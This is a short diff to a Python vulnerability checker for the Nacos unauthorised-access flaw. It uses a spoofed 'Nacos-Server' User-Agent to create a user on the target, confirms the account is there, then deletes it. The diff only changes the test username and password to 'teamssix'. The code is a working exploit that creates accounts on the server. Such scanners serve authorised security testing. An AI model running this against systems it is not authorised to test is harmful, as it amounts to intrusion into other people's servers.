@@ -10,17 +10,17 @@ requests.packages.urllib3.disable_warnings()
 headers = {'User-Agent': 'Nacos-Server'}
 
 def check_vuln(url):
-    url1 = url + '/v1/auth/users?username=foiyheiicmvczrzr&password=rvqwtgjvgxedtqhw'
+    url1 = url + '/v1/auth/users?username=teamssix&password=teamssix'
     r1 = requests.post(url1,headers=headers,verify=False)
     if r1.status_code ==200 and 'create user ok!' in r1.text:
         url2 = url + '/v1/auth/users?pageNo=1&pageSize=999'
         r2 = requests.get(url2,headers=headers,verify=False)
-        if r2.status_code==200 and 'foiyheiicmvczrzr' in r2.text:
+        if r2.status_code==200 and 'teamssix' in r2.text:
             print('%s 存在 Nacos 未授权'%url)
-            url3 = url + '/v1/auth/users?username=foiyheiicmvczrzr'
+            url3 = url + '/v1/auth/users?username=teamssix'
             r3 = requests.delete(url3,headers=headers,verify=False)
             if r3.status_code != 200 or 'delete user ok!' not in r3.text:
-                print('请手动检查创建的foiyheiicmvczrzr用户是否删除')
+                print('请手动检查创建的teamssix用户是否删除')
 
     else:
         print('%s 不存在 Nacos 未授权'%url)
